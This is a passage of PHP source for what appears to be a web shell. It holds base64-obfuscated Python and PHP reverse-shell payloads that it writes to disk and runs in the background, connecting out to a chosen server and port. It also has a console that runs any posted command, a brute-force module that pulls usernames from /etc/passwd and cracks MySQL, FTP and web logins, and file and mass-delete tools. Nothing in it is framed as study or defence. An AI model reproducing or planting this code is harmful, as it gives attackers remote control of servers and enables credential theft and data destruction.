		$content = base64_decode("IyEvdXNyL2Jpbi9weXRob24NCiNVc2FnZTogcHl0aG9uIGZpbGVuYW1lLnB5IEhPU1QgUE9SVA0KaW1wb3J0IHN5cywgc29ja2V0LCBvcywgc3VicHJvY2Vzcw0KaXBsbyA9IHN5cy5hcmd2WzFdDQpwb3J0bG8gPSBpbnQoc3lzLmFyZ3ZbMl0pDQpzb2NrZXQuc2V0ZGVmYXVsdHRpbWVvdXQoNjApDQpkZWYgcHliYWNrY29ubmVjdCgpOg0KICB0cnk6DQogICAgam1iID0gc29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCxzb2NrZXQuU09DS19TVFJFQU0pDQogICAgam1iLmNvbm5lY3QoKGlwbG8scG9ydGxvKSkNCiAgICBqbWIuc2VuZCgnJydcblB5dGhvbiBCYWNrQ29ubmVjdCBCeSBNci54QmFyYWt1ZGFcblRoYW5rcyBHb29nbGUgRm9yIFJlZmVyZW5zaVxuXG4nJycpDQogICAgb3MuZHVwMihqbWIuZmlsZW5vKCksMCkNCiAgICBvcy5kdXAyKGptYi5maWxlbm8oKSwxKQ0KICAgIG9zLmR1cDIoam1iLmZpbGVubygpLDIpDQogICAgb3MuZHVwMihqbWIuZmlsZW5vKCksMykNCiAgICBzaGVsbCA9IHN1YnByb2Nlc3MuY2FsbChbIi9iaW4vc2giLCItaSJdKQ0KICBleGNlcHQgc29ja2V0LnRpbWVvdXQ6DQogICAgcHJpbnQgIlRpbU91dCINCiAgZXhjZXB0IHNvY2tldC5lcnJvciwgZToNCiAgICBwcmludCAiRXJyb3IiLCBlDQpweWJhY2tjb25uZWN0KCk=");
		$nameFile = "bc.py";
		$exe = "python bc.py $server $port 1>/dev/null 2>&1 &";
	}

	if($_POST["backconnect"] == "php")
	{
		$content = base64_decode("PD9waHAKCmVycm9yX3JlcG9ydGluZygwKTsKc2V0X3RpbWVfbGltaXQoMCk7CgokaXAgPSAkYXJndlsxXTsKJHBvcnQgPSAkYXJndlsyXTsKCiRoZWFkZXIgPSAiCj09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09XG4KLi46OiBCYWNrQ29ubmVjdCBQSFAgQnkgSW5kb1NlYyAuLjo6XG4KPT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT1cbgoiOwoKZnVuY3Rpb24gZXhlKCRjbWQpCnsKCSRidWZmID0gJyc7CgoJaWYoZnVuY3Rpb25fZXhpc3RzKCdzeXN0ZW0nKSkKICAgIHsKCQlAb2Jfc3RhcnQoKTsKCQlAc3lzdGVtKCRjbWQpOwogICAgICAgICRidWZmID0gQG9iX2dldF9jb250ZW50cygpOwogICAgICAgIEBvYl9lbmRfY2xlYW4oKTsKCX0gCiAgICBlbHNlaWYoZnVuY3Rpb25fZXhpc3RzKCdleGVjJykpCiAgICB7CgkJQGV4ZWMoJGNtZCwkcmVzdWx0cyk7CgkJJGJ1ZmYgPSBAam9pbigiXG4iLCRyZXN1bHRzKTsKCX0gCiAgICBlbHNlaWYoZnVuY3Rpb25fZXhpc3RzKCdwYXNzdGhydScpKQogICAgewoJCUBvYl9zdGFydCgpOwoJCUBwYXNzdGhydSgkY21kKTsKICAgICAgICAkYnVmZiA9IEBvYl9nZXRfY29udGVudHMoKTsKCQlAb2JfZW5kX2NsZWFuKCk7Cgl9IAogICAgZWxzZWlmKGZ1bmN0aW9uX2V4aXN0cygnc2hlbGxfZXhlYycpKQogICAgewoJCSRidWZmID0gQHNoZWxsX2V4ZWMoJGNtZCk7Cgl9CglyZXR1cm4gJGJ1ZmY7Cn0KCmZ1bmN0aW9uIHNlbmRQYWNrYWdlKCRzb2NrZXQsICRwYWNrYWdlKQp7CiAgICBAZnB1dHMoJHNvY2tldCwgJHBhY2thZ2UpOwp9Cgokc29ja2V0ID0gZnNvY2tvcGVuKCRpcCwgJHBvcnQsICRlcnJubywgJGVycnN0cik7CgppZigkZXJybm8gIT09IDApIGRpZSgiJGVycm5vOiAkZXJyc3RyIik7IAppZighJHNvY2tldCkgZGllKCJVbmV4cGVjdGVkIGVycm9yIGhhcyBvY2N1cmVkLCBjb25uZWN0aW9uIG1heSBoYXZlIGZhaWxlZC4iKTsKCnNlbmRQYWNrYWdlKCRzb2NrZXQsICRoZWFkZXIpOwoKJGxlbiAgICAgICAgPSAxMDI0OwokaXBTZXJ2ZXIgICA9IGdldEhvc3RCeU5hbWUoZ2V0SG9zdE5hbWUoKSk7CiRpc1Jvb3QgICAgID0gKHBvc2l4X2dldHVpZCgpID09IDApID8gIiMiIDogIiQiOwokY21kICAgICAgICA9ICLilIxbJGlwU2VydmVyQEluZG9TZWNdflsiLmdldGN3ZCgpLiJdXG7ilJQkaXNSb290ICI7CgpzZW5kUGFja2FnZSgkc29ja2V0LCAkY21kKTsKCndoaWxlKCFmZW9mKCRzb2NrZXQpKXsKICAgICRjbWQgICAgICAgID0gIuKUjFskaXBTZXJ2ZXJASW5kb1NlY11+WyIuZ2V0Y3dkKCkuIl1cbuKUlCRpc1Jvb3QgIjsKICAgICRjb21tYW5kICAgID0gZmdldHMoJHNvY2tldCwgJGxlbik7CiAgICAkY29tbWFuZHMgICA9IHRyaW0oc3RydG9sb3dlcigkY29tbWFuZCkpOwoKICAgIGlmKAogICAgICAgICRjb21tYW5kcyA9PSAiZXhpdCIgfHwgCiAgICAgICAgJGNvbW1hbmRzID09ICJxdWl0IiB8fAogICAgICAgICRjb21tYW5kcyA9PSAicSIKICAgICkgYnJlYWs7CiAgICAKICAgIGlmKHByZWdfbWF0Y2goIi9jZFwgKFteXHNdKykvaSIsJGNvbW1hbmQsJHJyKSkgewoJICAgICRkZCA9ICRyclsxXTsKCSAgICBpZihpc19kaXIoJGRkKSkgY2hkaXIoJGRkKTsKCSAgICAkbyA9ICJcbiIuIuKUjFskaXBTZXJ2ZXJASW5kb1NlY11+WyIuZ2V0Y3dkKCkuIl1cbuKUlCRpc1Jvb3QgIjsKCX0gZWxzZSAkbyA9ICJcbiIuZXhlKCRjb21tYW5kKS4iXG5cbiRjbWQiOwoKICAgIHNlbmRQYWNrYWdlKCRzb2NrZXQsICRvKTsKfQpAZmNsb3NlKCRzb2NrZXQpOw==");
		$nameFile = "bc.php";
		$exe = "php bc.php $server $port 1>/dev/null 2>&1 &";
	}

	if(isset($_POST["backconnect"]) || isset($_POST["bpl"])) {
		$file = fopen($nameFile, "w");
		fwrite($file,$content);
		$out = exe($exe);
		sleep(1);
		$output = "<pre class='text-light'>$out\n".exe("ps aux | grep $nameFile")."</pre>";
		unlink($nameFile);
	}


}

function console()
{
	if(isset($_POST["console"]) || isset($_POST["cheat"])) {
		$command = (!$_POST["console"] == "") ? $_POST["console"] : $_POST["cheat"]." 2>&1";
		$out = exe($command);

		pages("console", ["Tools", "Console"], array("{{OUTPUT}}"), array($out));
	} else {
		pages("console", ["Tools", "Console"], array("{{OUTPUT}}"), array(""));
	}
}

function bruteforce()
{
	if(!isset($_POST["crack"])) {
		$ulist = (strtoupper(substr(PHP_OS, 0, 3)) !== 'WIN'?exe("cut -d: -f1 /etc/passwd"):"");
		pages("bruteforce", ["Tools", "Brute Force"], array("{{OUTPUT}}", "{{ULIST}}"), array("", $ulist));
	} else {
		$ulist = (strtoupper(substr(PHP_OS, 0, 3)) !== 'WIN'?exe("cut -d: -f1 /etc/passwd"):"");
		$url = $_POST['url'];
		$port = $_POST['port'];
		$protocol = $_POST['protocol'];
		$login = $_POST['login'];
		$ulistname = $_POST['ulist'];
		$plistname = $_POST['plist'];
		$save = $_POST['save'];

		$data = array();
		$output = array();

		foreach (explode("\n",$ulistname) as $username) {
			foreach (explode("\n",$plistname) as $password) {
				$data["login"] = trim($login);
				$data["url"] = trim($url);
				$data["port"] = trim($port);
				$data["protocol"] = trim($protocol);
				$data["username"] = trim($username);
				$data["password"] = trim($password);

				if($login == "mysqli_connect" || $login == "ftp_connect") $output[] = crackFunctionLogin($data);
				else $output[] =  curlRequestCrack($data);
			}
		}

		$fp = fopen($save, "w");
		fwrite($fp, implode(" \n", $output));
		fclose($fp);

		pages("bruteforce", ["Tools", "Brute Force"], array("{{OUTPUT}}", "{{ULIST}}"), array(implode(" ", $output), $ulist));
	}
	

}

if(isset($_GET["page"]))
{
	$page = $_GET["page"];
	if($page == "dashboard") dashboard();

	// File
	if($page == "filemanager") filemanager();
	if($page == "upload") upload();
	if($page == "viewfile") viewfile();
	if($page == "rename") renameF();
	if($page == "delete") hapus();
	if($page == "edit") editF();
	if($page == "chmod") chmods();
	if($page == "newfile") newfile();
	if($page == "newfolder") newfolder();
	if($page == "download") download($path);
	if($page == "backup") backup();

	// Mass
	// if($page == "mdeface") mdeface();
	if($page == "mdelete") mdelete();

	// Tools
	if($page == "console") console();
	if($page == "adminer") adminer();
	if($page == "network") network();
	if($page == "bruteforce") bruteforce();

	// Info
	if($page == "about") pages($page, ["About"]);
	if($page == "phpinfo") phpinfo();


	if($page == "logout") {
		session_destroy() ;
		echo '<script>window.location="?";</script>';
	} 

} else { dashboard(); }
